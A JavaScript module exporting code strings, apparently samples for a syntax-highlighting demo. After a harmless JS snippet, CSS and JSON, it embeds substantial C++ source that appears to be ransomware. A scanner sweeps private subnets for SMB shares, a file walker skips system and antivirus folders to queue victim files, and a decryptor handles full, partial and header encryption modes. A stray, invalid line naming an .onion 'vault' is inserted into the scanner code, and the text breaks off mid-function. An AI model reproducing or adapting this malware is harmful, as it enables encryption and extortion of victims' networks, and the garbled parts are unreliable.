export const JS = `
function createStyleObject(classNames, style) {
  return classNames.reduce((styleObject, className) => {
    return {...styleObject, ...style[className]};
  }, {});
}

function createClassNameString(classNames) {
  return classNames.join(' ');
}

// this comment is here to demonstrate an extremely long line length, well beyond what you should probably allow in your own code, though sometimes you'll be highlighting code you can't refactor, which is unfortunate but should be handled gracefully

function createChildren(style, useInlineStyles) {
  let childrenCount = 0;
  return children => {
    childrenCount += 1;
    return children.map((child, i) => createElement({
      node: child,
      style,
      useInlineStyles,
      key: "code-segment-2-1"
    }));
  }
}

function createElement({ node, style, useInlineStyles, key }) {
  const { properties, type, tagName, value } = node;
  if (type === "text") {
    return value;
  } else if (tagName) {
    const TagName = tagName;
    const childrenCreator = createChildren(style, useInlineStyles);
    const props = (
      useInlineStyles
      ? { style: createStyleObject(properties.className, style) }
      : { className: createClassNameString(properties.className) }
    );
    const children = childrenCreator(node.children);
    return <TagName key={key} {...props}>{children}</TagName>;
  }
}`;

export const CSS = `

@font-face {
  font-family: 'Open Sans';
  src: url('../public/fonts/OpenSans/OpenSans-Light.woff2') format('woff2'),
      url('../public/fonts/OpenSans/OpenSans-Light.woff') format('woff');
  font-weight: 300;
  font-style: normal;
  font-display: swap;
}

@font-face {
  font-family: 'Open Sans';
  src: url('../public/fonts/OpenSans/OpenSans-SemiBold.woff2') format('woff2'),
      url('../public/fonts/OpenSans/OpenSans-SemiBold.woff') format('woff');
  font-weight: 600;
  font-style: normal;
  font-display: swap;
}

@font-face {
  font-family: 'Open Sans';
  src: url('../public/fonts/OpenSans/OpenSans-Regular.woff2') format('woff2'),
      url('../public/fonts/OpenSans/OpenSans-Regular.woff') format('woff');
  font-weight: normal;
  font-style: normal;
  font-display: swap;
}
`;

export const JSON = `{
  "glossary": {
      "title": "example glossary",
  "GlossDiv": {
          "title": "S",
    "GlossList": {
              "GlossEntry": {
                  "ID": "SGML",
        "SortAs": "SGML",
        "GlossTerm": "Standard Generalized Markup Language",
        "Acronym": "SGML",
        "Abbrev": "ISO 8879:1986",
        "GlossDef": {
                      "para": "A meta-markup language, used to create markup languages such as DocBook.",
          "GlossSeeAlso": ["GML", "XML"]
                  },
        "GlossSee": "markup"
              }
          }
      }
  }
}`;

export const NETWORK_SCANNER_CPP = `
#include "network_scanner.h"
#include "queue.h"
#include <iphlpapi.h>
#include <lmshare.h>
#include <lm.h>
#include <winnetwk.h>
#include <icmpapi.h>
#include <ws2ipdef.h>
#include <ws2tcpip.h>
#include <shlwapi.h>
#include <MSWSock.h>
#include "filesystem.h"
#include "threadpool.h"

#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ws2_32.lib")

#define SMB_PORT 445
#define STOP_MARKER 0xFFFFFFFF

LOCATION ONLINE VAULT = "ftp://youllneverpealthis.onion"

enum COMPLETION_KEYS {

	START_COMPLETION_KEY = 1,
	CONNECT_COMPLETION_KEY = 2,
	TIMER_COMPLETION_KEY = 3

};

enum STATES {

	CONNECTED,
	CONNECTING,
	NOT_CONNECTED

};

STATIC struct hostent* g_HostEntry = NULL;

#pragma region TYPEDEFS

typedef struct subnet_info_ {

	ULONG dwAddress;
	TAILQ_ENTRY(subnet_info_) Entries;

} SUBNET_INFO, *PSUBNET_INFO;

typedef struct host_info_ {

	ULONG dwAddres;
	WCHAR wszAddress[INET_ADDRSTRLEN];
	TAILQ_ENTRY(host_info_) Entries;

} HOST_INFO, *PHOST_INFO;

typedef struct connect_context_ {

	OVERLAPPED Overlapped;
	SOCKET s;
	DWORD dwAddres;
	BYTE State;
	TAILQ_ENTRY(connect_context_) Entries;

} CONNECT_CONTEXT, *PCONNECT_CONTEXT;



typedef TAILQ_HEAD(subnet_list_, subnet_info_) SUBNET_LIST, * PSUBNET_LIST;
typedef TAILQ_HEAD(host_list_, host_info_) HOST_LIST, * PHOST_LIST;

typedef TAILQ_HEAD(connection_list_, connect_context_) CONNECTION_LIST, * PCONNECTION_LIST;

#pragma endregion TYPEDEFS

#pragma region VARIABLES

STATIC LPFN_CONNECTEX g_ConnectEx = NULL;
STATIC CRITICAL_SECTION g_CriticalSection;
STATIC SUBNET_LIST g_SubnetList;
STATIC HOST_LIST g_HostList;
STATIC CONNECTION_LIST g_ConnectionList;
STATIC HANDLE g_IocpHandle = NULL;
STATIC LONG g_ActiveOperations;

#pragma endregion VARIABLES

STATIC
DWORD GetCurrentIpAddress()
{
	CHAR szHostName[256];
	struct in_addr InAddr;

	if (SOCKET_ERROR == gethostname(szHostName, 256)) {
		return 0;
	}

	g_HostEntry = gethostbyname(szHostName);
	if (!g_HostEntry) {
		return 0;
	}

	return 0;
}

STATIC
BOOL
GetConnectEX()
{
	SOCKET sock;
	DWORD dwBytes;
	int rc;

	/* Dummy socket needed for WSAIoctl */
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET)
		return FALSE;

	GUID guid = WSAID_CONNECTEX;
	rc = WSAIoctl(sock, SIO_GET_EXTENSION_FUNCTION_POINTER,
		&guid, sizeof(guid),
		&g_ConnectEx, sizeof(g_ConnectEx),
		&dwBytes, NULL, NULL);

	if (rc != 0)
		return FALSE;

	rc = closesocket(sock);
	if (rc != 0)
		return FALSE;

	return TRUE;
}

STATIC
BOOL
GetSubnets(__in PSUBNET_LIST SubnetList)
{
	ULONG TableSize = 0;
	PMIB_IPNETTABLE IpNetTable = NULL;

	GetIpNetTable(IpNetTable, &TableSize, FALSE);
	if (!TableSize) {
		return FALSE;
	}

	IpNetTable = (PMIB_IPNETTABLE)m_malloc(TableSize);
	if (!IpNetTable) {
		return FALSE;
	}

	ULONG Result = GetIpNetTable(IpNetTable, &TableSize, FALSE);
	if (Result != ERROR_SUCCESS) {

		m_free(IpNetTable);
		return FALSE;

	}

	for (ULONG i = 0; i < IpNetTable->dwNumEntries; i++) {

		WCHAR wszIpAddress[INET_ADDRSTRLEN];
		ULONG dwAddress = IpNetTable->table[i].dwAddr;
		PUCHAR HardwareAddres = IpNetTable->table[i].bPhysAddr;
		ULONG HardwareAddressSize = IpNetTable->table[i].dwPhysAddrLen;

		RtlSecureZeroMemory(wszIpAddress, sizeof(wszIpAddress));

		IN_ADDR InAddr;
		InAddr.S_un.S_addr = dwAddress;
		PCHAR szIpAddress = inet_ntoa(InAddr);
		DWORD le = WSAGetLastError();

		PCSTR p1 = StrStrIA(szIpAddress, OBFA("172."));
		PCSTR p2 = StrStrIA(szIpAddress, OBFA("192.168."));
		PCSTR p3 = StrStrIA(szIpAddress, OBFA("10."));
		PCSTR p4 = StrStrIA(szIpAddress, OBFA("169."));

		if (p1 == szIpAddress ||
			p2 == szIpAddress ||
			p3 == szIpAddress ||
			p4 == szIpAddress)
		{

			BOOL Found = FALSE;

			PSUBNET_INFO SubnetInfo = NULL;
			TAILQ_FOREACH(SubnetInfo, SubnetList, Entries) {

				if (!memcmp(&SubnetInfo->dwAddress, &dwAddress, 3)) {

					Found = TRUE;
					break;

				}

			}

			if (!Found) {

				BYTE bAddres[4];
				*(ULONG*)bAddres = dwAddress;
				bAddres[3] = 0;

				PSUBNET_INFO NewSubnet = (PSUBNET_INFO)m_malloc(sizeof(SUBNET_INFO));
				if (!NewSubnet) {
					break;
				}

				RtlCopyMemory(&NewSubnet->dwAddress, bAddres, 4);
				TAILQ_INSERT_TAIL(SubnetList, NewSubnet, Entries);

			}

		}
	}

	m_free(IpNetTable);
	return TRUE;
}

VOID
network_scanner::EnumShares(
	__in PWCHAR pwszIpAddress,
	__out PSHARE_LIST ShareList
	)
{
	NET_API_STATUS Result;
	LPSHARE_INFO_1 ShareInfoBuffer = NULL;
	DWORD er = 0, tr = 0, resume = 0;;

	do
	{
		Result = NetShareEnum(pwszIpAddress, 1, (LPBYTE*)&ShareInfoBuffer, MAX_PREFERRED_LENGTH, &er, &tr, &resume);
		if (Result == ERROR_SUCCESS)
		{

			LPSHARE_INFO_1 TempShareInfo = ShareInfoBuffer;

			for (DWORD i = 1; i <= er; i++)
			{

				if (TempShareInfo->shi1_type == STYPE_DISKTREE	||
					TempShareInfo->shi1_type == STYPE_SPECIAL	||
					TempShareInfo->shi1_type == STYPE_TEMPORARY)
				{

					PSHARE_INFO ShareInfo = (PSHARE_INFO)m_malloc(sizeof(SHARE_INFO));

					if (ShareInfo)
					{

						lstrcpyW(ShareInfo->wszSharePath, OBFW(L"\\\\"));
						lstrcatW(ShareInfo->wszSharePath, pwszIpAddress);
						lstrcatW(ShareInfo->wszSharePath, OBFW(L"\\"));
						lstrcatW(ShareInfo->wszSharePath, TempShareInfo->shi1_netname);

						TAILQ_INSERT_TAIL(ShareList, ShareInfo, Entries);

					}

				}

				TempShareInfo++;

			}

			NetApiBufferFree(ShareInfoBuffer);
		}

	} while (Result == ERROR_MORE_DATA);

}

STATIC
DWORD
WINAPI
HostHandler(__in PVOID pArg)
{
	network_scanner::SHARE_LIST ShareList;
	TAILQ_INIT(&ShareList);

	while (TRUE) {

		EnterCriticalSection(&g_CriticalSection);

		PHOST_INFO HostInfo = TAILQ_FIRST(&g_HostList);
		if (HostInfo == NULL) {

			LeaveCriticalSection(&g_CriticalSection);
			Sleep(1000);
			continue;

		}

		TAILQ_REMOVE(&g_HostList, HostInfo, Entries);
		LeaveCriticalSection(&g_CriticalSection);

		if (HostInfo->dwAddres == STOP_MARKER) {

			m_free(HostInfo);
			ExitThread(EXIT_SUCCESS);

		}

		network_scanner::EnumShares(HostInfo->wszAddress, &ShareList);
		while (!TAILQ_EMPTY(&ShareList))
		{

			network_scanner::PSHARE_INFO ShareInfo = TAILQ_FIRST(&ShareList);
			filesystem::SearchFiles(ShareInfo->wszSharePath, threadpool::NETWORK_THREADPOOL);
			TAILQ_REMOVE(&ShareList, ShareInfo, Entries);
			m_free(ShareInfo);

		}
		m_free(HostInfo);

	}

	ExitThread(EXIT_SUCCESS);
}

STATIC
BOOL
AddHost(
	__in DWORD dwAddres
	)
{
	if (g_HostEntry) {
		INT i = 0;
		while (g_HostEntry->h_addr_list[i] != NULL) {
			DWORD dwCurrentAddr = *(DWORD*)g_HostEntry->h_addr_list[i++];
			if (dwCurrentAddr == dwAddres) {
				return FALSE;
			}
		}
	}

	PHOST_INFO HostInfo = (PHOST_INFO)m_malloc(sizeof(HOST_INFO));
	if (!HostInfo) {
		return FALSE;
	}

	DWORD dwAddress = INET_ADDRSTRLEN;
	SOCKADDR_IN temp;
	temp.sin_addr.s_addr = dwAddres;
	temp.sin_port = 0;
	temp.sin_family = AF_INET;
	HostInfo->dwAddres = dwAddres;

	if (dwAddres != STOP_MARKER) {

		if (SOCKET_ERROR == WSAAddressToStringW((LPSOCKADDR)&temp, sizeof(temp), NULL, HostInfo->wszAddress, &dwAddres)) {

			m_free(HostInfo);
			return FALSE;

		}

	}

	EnterCriticalSection(&g_CriticalSection); {

		TAILQ_INSERT_TAIL(&g_HostList, HostInfo, Entries);

	}
	LeaveCriticalSection(&g_CriticalSection);
	return TRUE;
}

STATIC
BOOL
CreateHostTable()
{
	PSUBNET_INFO SubnetInfo = TAILQ_FIRST(&g_SubnetList);
	if (!SubnetInfo) {
		return FALSE;
	}

	BYTE bAddres[4];
	DWORD dwAddress;
	RtlCopyMemory(bAddres, &SubnetInfo->dwAddress, 4);

	for (BYTE i = 0; i < 255; i++) {

		bAddres[3] = i;
		RtlCopyMemory(&dwAddress, bAddres, 4);

		PCONNECT_CONTEXT ConnectCtx = (PCONNECT_CONTEXT)GlobalAlloc(GPTR, sizeof(CONNECT_CONTEXT));
		if (!ConnectCtx) {
			break;
		}

		ConnectCtx->dwAddres = dwAddress;
		ConnectCtx->State = NOT_CONNECTED;
		ConnectCtx->s = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);
		if (ConnectCtx->s == INVALID_SOCKET) {

			GlobalFree(ConnectCtx);
			continue;

		}

		SOCKADDR_IN SockAddr;
		RtlSecureZeroMemory(&SockAddr, sizeof(SockAddr));
		SockAddr.sin_family = AF_INET;
		SockAddr.sin_port = 0;
		SockAddr.sin_addr.s_addr = INADDR_ANY;

		if (bind(ConnectCtx->s, (CONST SOCKADDR*) & SockAddr, sizeof(SockAddr)) != ERROR_SUCCESS) {

			closesocket(ConnectCtx->s);
			GlobalFree(ConnectCtx);
			continue;

		}

		if (!CreateIoCompletionPort((HANDLE)ConnectCtx->s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)) {

			closesocket(ConnectCtx->s);
			GlobalFree(ConnectCtx);
			continue;

		}

		TAILQ_INSERT_TAIL(&g_ConnectionList, ConnectCtx, Entries);

	}

	TAILQ_REMOVE(&g_SubnetList, SubnetInfo, Entries);
	m_free(SubnetInfo);
	return TRUE;
}

STATIC
VOID
ScanHosts()
{
	PCONNECT_CONTEXT ConnectCtx = NULL;
	TAILQ_FOREACH(ConnectCtx, &g_ConnectionList, Entries) {

		DWORD dwBytesSent;
		SOCKADDR_IN SockAddr;
		RtlSecureZeroMemory(&SockAddr, sizeof(SockAddr));
		SockAddr.sin_family = AF_INET;
		SockAddr.sin_port = htons(SMB_PORT);
		SockAddr.sin_addr.s_addr = ConnectCtx->dwAddres;

		if (g_ConnectEx(ConnectCtx->s, (CONST SOCKADDR*) & SockAddr, sizeof(SockAddr), NULL, 0, &dwBytesSent, (LPOVERLAPPED)ConnectCtx)) {

			ConnectCtx->State = CONNECTED;
			AddHost(ConnectCtx->dwAddres);

		}
		else if (WSA_IO_PENDING == WSAGetLastError()) {

			g_ActiveOperations++;
			ConnectCtx->State = CONNECTING;

		}
	}
}

STATIC
BOOL
CompleteAsyncConnect(SOCKET s)
{
	int Result = setsockopt(s, SOL_SOCKET, SO_UPDATE_CONNECT_CONTEXT, NULL, 0);
	if (Result != ERROR_SUCCESS)
		return FALSE;

	int Seconds;
	int Bytes = sizeof(Seconds);
	Result = getsockopt(s, SOL_SOCKET, SO_CONNECT_TIME, (char*)&Seconds, (PINT)&Bytes);
	if (Result != ERROR_SUCCESS)
		return FALSE;

	if (Seconds == 0xFFFFFFFF)
		return FALSE;

	return TRUE;
}

STATIC
VOID
WINAPI
TimerCallback(PVOID Arg, BOOLEAN TimerOrWaitFired) {
	PostQueuedCompletionStatus(g_IocpHandle, 0, TIMER_COMPLETION_KEY, NULL);
}

STATIC
DWORD
WINAPI
PortScanHandler(PVOID pArg)
{
	g_ActiveOperations = 0;
	HANDLE hTimer = NULL;
	BOOL IsTimerActivated = FALSE;

	HANDLE hTimerQueue = CreateTimerQueue();
	if (!hTimerQueue) {
		ExitThread(EXIT_FAILURE);
	}

	while (TRUE) {

		DWORD dwBytesTransferred;
		ULONG_PTR CompletionStatus;
		PCONNECT_CONTEXT ConnectContext;

		BOOL Success = GetQueuedCompletionStatus(g_IocpHandle, &dwBytesTransferred, &CompletionStatus, (LPOVERLAPPED*)&ConnectContext, INFINITE);

		if (CompletionStatus == START_COMPLETION_KEY) {

			if (!CreateHostTable()) {
				break;
			}

			ScanHosts();

			if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {
				ExitThread(EXIT_FAILURE);
			}

			IsTimerActivated = FALSE;

		} else if (CompletionStatus == CONNECT_COMPLETION_KEY) {

			g_ActiveOperations--;

			if (Success && CompleteAsyncConnect(ConnectContext->s)) {

				ConnectContext->State = CONNECTED;
				AddHost(ConnectContext->dwAddres);

			} else {

				ConnectContext->State = NOT_CONNECTED;

			}

			if (!g_ActiveOperations && IsTimerActivated) {

				while (!TAILQ_EMPTY(&g_ConnectionList)) {

					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&g_ConnectionList);
					shutdown(ConnectCtx->s, SD_SEND);
					closesocket(ConnectCtx->s);
					TAILQ_REMOVE(&g_ConnectionList, ConnectCtx, Entries);
					GlobalFree(ConnectCtx);

				}

				if (!CreateHostTable()) {
					break;
				}

				ScanHosts();

				if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {
					ExitThread(EXIT_FAILURE);
				}

				IsTimerActivated = FALSE;

			}

		} else if (CompletionStatus == TIMER_COMPLETION_KEY) {

			IsTimerActivated = TRUE;

			if (g_ActiveOperations) {

				PCONNECT_CONTEXT ConnectCtx = NULL;
				TAILQ_FOREACH(ConnectCtx, &g_ConnectionList, Entries) {

					if (ConnectCtx->State == CONNECTING) {
						CancelIo((HANDLE)ConnectCtx->s);
					}

				}

			} else {

				while (!TAILQ_EMPTY(&g_ConnectionList)) {

					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&g_ConnectionList);
					shutdown(ConnectCtx->s, SD_SEND);
					closesocket(ConnectCtx->s);
					TAILQ_REMOVE(&g_ConnectionList, ConnectCtx, Entries);
					GlobalFree(ConnectCtx);

				}

				if (!CreateHostTable()) {
					break;
				}

				ScanHosts();

				if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {
					ExitThread(EXIT_FAILURE);
				}

				IsTimerActivated = FALSE;
			}

		}

	}

	DeleteTimerQueue(hTimerQueue);
	ExitThread(EXIT_SUCCESS);
}


VOID
network_scanner::StartScan()
{
	WSADATA WsaData;
	HANDLE hHostHandler = NULL, hPortScan = NULL;
	PSUBNET_INFO SubnetInfo = NULL;

	g_ActiveOperations = 0;
	WSAStartup(MAKEWORD(2, 2), &WsaData);
	InitializeCriticalSection(&g_CriticalSection);

	if (!GetConnectEX()) {
		goto cleanup;
	}

	g_IocpHandle = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, NULL, 0);
	if (g_IocpHandle == NULL) {
		goto cleanup;
	}

	GetCurrentIpAddress();

	TAILQ_INIT(&g_SubnetList);
	TAILQ_INIT(&g_HostList);
	TAILQ_INIT(&g_ConnectionList);

	if (!GetSubnets(&g_SubnetList)) {
		goto cleanup;
	}

	hHostHandler = CreateThread(NULL, 0, &HostHandler, NULL, 0, NULL);
	if (hHostHandler == INVALID_HANDLE_VALUE) {
		goto cleanup;
	}

	hPortScan = CreateThread(NULL, 0, &PortScanHandler, NULL, 0, NULL);
	if (hPortScan == INVALID_HANDLE_VALUE) {
		goto cleanup;
	}

	PostQueuedCompletionStatus(g_IocpHandle, 0, START_COMPLETION_KEY, NULL);
	WaitForSingleObject(hPortScan, INFINITE);

	AddHost(STOP_MARKER);
	WaitForSingleObject(hHostHandler, INFINITE);

cleanup:
	DeleteCriticalSection(&g_CriticalSection);
	if (g_IocpHandle) {
		CloseHandle(g_IocpHandle);
	}
	if (hHostHandler) {
		CloseHandle(hHostHandler);
	}
	if (hPortScan) {
		CloseHandle(hPortScan);
	}

	WSACleanup();
}
`;

export const NETWORK_SCANNER_H = `
#pragma once
#include "common.h"
#include "queue.h"

namespace network_scanner {


	typedef struct share_info_ {

		WCHAR wszSharePath[16000];
		TAILQ_ENTRY(share_info_) Entries;

	} SHARE_INFO, * PSHARE_INFO;


	typedef TAILQ_HEAD(share_list_, share_info_) SHARE_LIST, * PSHARE_LIST;

	VOID StartScan();
	VOID EnumShares(PWCHAR pwszIpAddress, PSHARE_LIST ShareList);
};
`;
export const SEARCH_CPP = `
#include "filesystem.h"
#include <shlwapi.h>
#include "threadpool.h"
#include "global_parameters.h"

typedef struct directory_info_ {

	std::wstring Directory;
	TAILQ_ENTRY(directory_info_) Entries;

} DIRECTORY_INFO, *PDIRECTORY_INFO;

STATIC
std::wstring
MakeSearchMask(__in std::wstring Directory)
{
	WCHAR t = Directory[Directory.length() - 1];
	std::wstring SearchMask = t == L'\\' ? Directory + OBFW(L"*") : Directory + OBFW(L"\\*");
	return SearchMask;
}

STATIC
std::wstring
MakePath(
	__in std::wstring Directory,
	__in std::wstring Filename
	)
{
	WCHAR t = Directory[Directory.length() - 1];
	std::wstring Path = t == L'\\' ? Directory + Filename : Directory + OBFW(L"\\") + Filename;
	return Path;
}

STATIC
BOOL
CheckDirectory(__in LPCWSTR Directory)
{
	LPCWSTR BlackList[] =
	{

		OBFW(L"tmp"),
		OBFW(L"winnt"),
		OBFW(L"temp"),
		OBFW(L"thumb"),
		OBFW(L"$Recycle.Bin"),
		OBFW(L"$RECYCLE.BIN"),
		OBFW(L"Boot"),
		OBFW(L"Windows"),
		OBFW(L"Trend Micro")

	};

	INT Count = sizeof(BlackList) / sizeof(LPWSTR);
	for (INT i = 0; i < Count; i++) {
		if (StrStrIW(Directory, BlackList[i])) {
			return FALSE;
		}
	}

	return TRUE;
}

STATIC
BOOL
CheckFilename(__in LPCWSTR FileName)
{
	if (StrStrIW(FileName, global::GetExtention())) {
		return TRUE;
	}

	return FALSE;
}


VOID
filesystem::SearchFiles(
	__in std::wstring StartDirectory,
	__in INT ThreadPoolID
	)
{
	TAILQ_HEAD(, directory_info_) DirectoryList;
	TAILQ_INIT(&DirectoryList);

	PDIRECTORY_INFO StartDirectoryInfo = new DIRECTORY_INFO;
	if (!StartDirectoryInfo) {
		return;
	}

	StartDirectoryInfo->Directory = StartDirectory;
	TAILQ_INSERT_TAIL(&DirectoryList, StartDirectoryInfo, Entries);

	while (!TAILQ_EMPTY(&DirectoryList)) {

		WIN32_FIND_DATAW FindData;
		PDIRECTORY_INFO DirectoryInfo = TAILQ_FIRST(&DirectoryList);
		if (DirectoryInfo == NULL) {
			break;
		}

		std::wstring CurrentDirectory = DirectoryInfo->Directory;
		std::wstring SearchMask = MakeSearchMask(CurrentDirectory);

		HANDLE hSearchFile = FindFirstFileW(SearchMask.c_str(), &FindData);
		if (hSearchFile == INVALID_HANDLE_VALUE) {

			TAILQ_REMOVE(&DirectoryList, DirectoryInfo, Entries);
			delete DirectoryInfo;
			continue;

		}

		do {

			if (!lstrcmpW(FindData.cFileName, OBFW(L".")) ||
				!lstrcmpW(FindData.cFileName, OBFW(L"..")) ||
				FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
			{
				continue;
			}

			if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
				CheckDirectory(FindData.cFileName))
			{

				std::wstring Directory = MakePath(CurrentDirectory, FindData.cFileName);
				PDIRECTORY_INFO DirectoryInfo = new DIRECTORY_INFO;
				DirectoryInfo->Directory = Directory;
				TAILQ_INSERT_TAIL(&DirectoryList, DirectoryInfo, Entries);

			}
			else if (CheckFilename(FindData.cFileName)) {

				std::wstring Filename = MakePath(CurrentDirectory, FindData.cFileName);
				threadpool::PutTask(ThreadPoolID, Filename);

			}


		} while (FindNextFileW(hSearchFile, &FindData));

		TAILQ_REMOVE(&DirectoryList, DirectoryInfo, Entries);
		delete DirectoryInfo;
		FindClose(hSearchFile);
		Sleep(50);
	}
}


DWORD
WINAPI
filesystem::StartLocalSearch(PVOID pArg)
{
	filesystem::PDRIVE_LIST DriveList = (filesystem::PDRIVE_LIST)pArg;

	filesystem::PDRIVE_INFO DriveInfo = NULL;
	TAILQ_FOREACH(DriveInfo, DriveList, Entries) {
		SearchFiles(DriveInfo->RootPath, threadpool::LOCAL_THREADPOOL);
	}

	ExitThread(EXIT_SUCCESS);
}
`;

export const DECRYPTOR_CPP = `
#include "decryptor.h"
#include <wincrypt.h>

#define EXIT_COMPLETION_KEY (ULONG_PTR)666

STATIC HANDLE g_IocpHandle;
STATIC HANDLE g_Threads[32];
STATIC INT g_ThreadsNumber;
STATIC CONST DWORD BufferSize = 5242880;

enum ENCRYPT_MODES {

	FULL_ENCRYPT = 0x24,
	PARTLY_ENCRYPT = 0x25,
	HEADER_ENCRYPT = 0x26

};

BOOL
decryptor::ChangeFileName(__in LPCWSTR OldName)
{
	LPWSTR NewName = (LPWSTR)memory::Alloc(32727);
	if (!NewName) {
		return FALSE;
	}

	lstrcpynW(NewName, OldName, lstrlenW(OldName) - 5);
	MoveFileW(OldName, NewName);
	memory::Free(NewName);
	return TRUE;
}

STATIC
BOOL
ReadEncryptInfo(__in decryptor::LPFILE_INFO FileInfo)
{
	DWORD BytesRead;
	BOOL Success;
	LARGE_INTEGER Offset;
	BYTE Buffer[10];

	Offset.QuadPart = -534;
	if (!SetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_END)) {
		return FALSE;
	}

	Success = ReadFile(FileInfo->FileHandle, FileInfo->EncryptedKey, 524, &BytesRead, NULL);
	if (!Success || BytesRead != 524) {
		return FALSE;
	}

	Success = ReadFile(FileInfo->FileHandle, Buffer, 10, &BytesRead, NULL);
	if (!Success || BytesRead != 10) {
		return FALSE;
	}

	FileInfo->EncryptMode = Buffer[0];
	FileInfo->DataPercent = Buffer[1];
	memory::Copy(&FileInfo->OriginalFileSize, Buffer + 2, 8);

	Offset.QuadPart = 0;
	return SetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_BEGIN);
}

VOID
decryptor::CloseFile(__in decryptor::LPFILE_INFO FileInfo)
{
	if (FileInfo->FileHandle != INVALID_HANDLE_VALUE) {
		CloseHandle(FileInfo->FileHandle);
		FileInfo->FileHandle = INVALID_HANDLE_VALUE;
	}

	RtlSecureZeroMemory(FileInfo->EncryptedKey, sizeof(FileInfo->EncryptedKey));
}

STATIC
BOOL
OpenFileDecrypt(__in decryptor::LPFILE_INFO FileInfo)
{
	FileInfo->FileHandle = CreateFileW(FileInfo->Filename,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);

	DWORD le = GetLastError();
	if (FileInfo->FileHandle == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	LARGE_INTEGER FileSize;
	if (!GetFileSizeEx(FileInfo->FileHandle, &FileSize) ||
		!FileSize.QuadPart ||
		FileSize.QuadPart < 534)
	{

		CloseFile(FileInfo);
		return FALSE;

	}

	if (!ReadEncryptInfo(FileInfo))
	{

		CloseFile(FileInfo);
		return FALSE;

	}

	FileInfo->FileSize = FileInfo->OriginalFileSize;

	return TRUE;
}

STATIC
BOOL
WriteDecryptedData(
	__in HANDLE hFile,
	__in LPVOID Buffer,
	__in DWORD Size
)
{
	DWORD TotalWritten = 0;
	DWORD BytesWritten = 0;
	DWORD BytesToWrite = Size;
	DWORD Offset = 0;

	while (TotalWritten != Size)
	{

		if (!WriteFile(hFile, (LPBYTE)Buffer + Offset, BytesToWrite, &BytesWritten, NULL) || !BytesWritten) {

			return FALSE;

		}

		Offset += BytesWritten;
		TotalWritten += BytesWritten;
		BytesToWrite -= BytesWritten;

	}

	return TRUE;
}

STATIC
BOOL
DecryptHeader(
	__in decryptor::LPFILE_INFO FileInfo,
	__in LPBYTE Buffer,
	__in HCRYPTPROV CryptoProvider
)
{
	BOOL Success = FALSE;
	DWORD BytesRead = 0;
	DWORD BytesToRead = 0;
	DWORD BytesToWrite = 0;
	LONGLONG TotalRead = 0;
	LONGLONG BytesToEncrypt;
	LARGE_INTEGER Offset;

	BytesToEncrypt = 1048576;

	while (TotalRead < BytesToEncrypt) {

		LONGLONG BytesLeft = BytesToEncrypt - TotalRead;
		BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;

		Success = ReadFile(FileInfo->FileHandle, Buffer, BytesToRead, &BytesRead, NULL);
		if (!Success || !BytesRead) {
			break;
		}

		TotalRead += BytesRead;
		BytesToWrite = BytesRead;

		ECRYPT_decrypt_bytes(&FileInfo->CryptCtx, Buffer, Buffer, BytesRead);

		Offset.QuadPart = -((LONGLONG)BytesRead);
		if (!SetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {
			break;
		}

		Success = WriteDecryptedData(FileInfo->FileHandle, Buffer, BytesToWrite);
		if (!Success) {
			break;
		}

	}

	return TRUE;
}

STATIC
BOOL
DecryptPartly(
	__in decryptor::LPFILE_INFO FileInfo,
	__in LPBYTE Buffer,
	__in HCRYPTPROV CryptoProvider,
	__in LONGLONG DataPercent
)
{
	BOOL Success = FALSE;
	DWORD BytesRead = 0;
	DWORD BytesToRead = 0;
	DWORD BytesToWrite = 0;
	LONGLONG TotalRead = 0;
	LONGLONG BytesToEncrypt;
	LARGE_INTEGER Offset;
	LONGLONG PartSize = 0;
	LONGLONG StepSize = 0;
	INT StepsCount = 0;

	switch (DataPercent) {
	case 20:
		PartSize = (FileInfo->OriginalFileSize / 100) * 7;
		StepsCount = 3;
		StepSize = (FileInfo->OriginalFileSize - (PartSize * 3)) / 2;
		break;

	case 50:
		PartSize = (FileInfo->OriginalFileSize / 100) * 10;
		StepsCount = 5;
		StepSize = PartSize;
		break;

	default:
		return FALSE;
	}

	for (INT i = 0; i < StepsCount; i++) {

		TotalRead = 0;
		BytesToEncrypt = PartSize;

		if (i != 0) {

			Offset.QuadPart = StepSize;
			if (!SetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {
				break;
			}

		}

		while (TotalRead < BytesToEncrypt) {

			LONGLONG BytesLeft = BytesToEncrypt - TotalRead;
			BytesToRead = BytesLeft > BufferSize ? BufferSize : (DWORD)BytesLeft;

			Success = ReadFile(FileInfo->FileHandle, Buffer, BytesToRead, &BytesRead, NULL);
			if (!Success || !BytesRead) {
				break;
			}

			TotalRead += BytesRead;
			BytesToWrite = BytesRead;

			ECRYPT_decrypt_bytes(&FileInfo->CryptCtx, Buffer, Buffer, BytesRead);

			Offset.QuadPart = -((LONGLONG)BytesRead);
			if (!SetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {
				break;
			}

			Success = WriteDecryptedData(FileInfo->FileHandle, Buffer, BytesToWrite);
			if (!Success) {
				break;
			}

		}

	}

	return TRUE;
}

STATIC
BOOL
DecryptFull(
	__in decryptor::LPFILE_INFO FileInfo,
	__in LPBYTE Buffer,
	__in HCRYPTPROV CryptoProvider
)
{
	BOOL Success = FALSE;
